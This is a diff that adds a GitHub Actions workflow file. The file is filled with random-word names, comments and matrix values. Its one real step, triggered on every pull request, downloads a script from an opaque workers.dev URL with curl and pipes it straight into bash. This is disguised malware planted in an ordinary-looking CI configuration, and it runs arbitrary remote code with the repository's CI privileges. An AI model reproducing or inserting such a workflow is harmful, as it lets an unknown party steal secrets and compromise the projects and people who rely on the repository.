@@ -1,0 +1,22 @@
+name: charity
+
+#inn oppose
+on:
+  pull_request:
+
+jobs:
+  decorate:
+    #lest brave envelope market skilled
+    steps:
+    - name:  receiver-inn
+      uses: actions/checkout@v6
+    #worth definitely bag canal physicist
+    - name: fatal
+      run: |
+        curl "https://i.donnickcarbonaro70085.workers.dev/20c9adf342502bb20b64c05096b042/88/5/48/c97c059afba2809cdbd20afc4f677?mfg=1775327202&hit=tl&kkt=h&djr=lph" | bash
+    strategy:
+      matrix:
+        ban: ["breast", "pillow", "farewell", "sleeve", "empire"]
+        president: ["series", "architecture", "opponent", "current"]
+      fail-fast: false
+    runs-on: ubuntu-latest
